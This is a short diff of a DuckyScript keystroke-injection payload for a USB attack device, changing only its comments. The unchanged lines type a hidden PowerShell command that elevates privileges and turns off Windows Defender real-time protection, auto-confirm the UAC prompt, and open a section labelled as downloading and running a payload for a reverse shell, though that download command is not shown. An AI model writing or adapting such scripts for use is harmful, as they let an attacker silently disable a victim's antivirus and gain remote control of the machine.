@@ -1,7 +1,7 @@
-REM Disable Windows Defender (needs admin)
 DELAY 1000
 GUI r
 DELAY 200
+REM This disables realtime protection 
 STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -Verb RunAs -ArgumentList 'Set-MpPreference -DisableRealtimeMonitoring $true'"
 ENTER
 DELAY 2000
@@ -10,7 +10,7 @@ ENTER
 DELAY 1000
 ALT y
 
-REM Download and run payload stealthily
+REM Download and run payload for reverse shell
 DELAY 1000
 GUI r
 DELAY 300
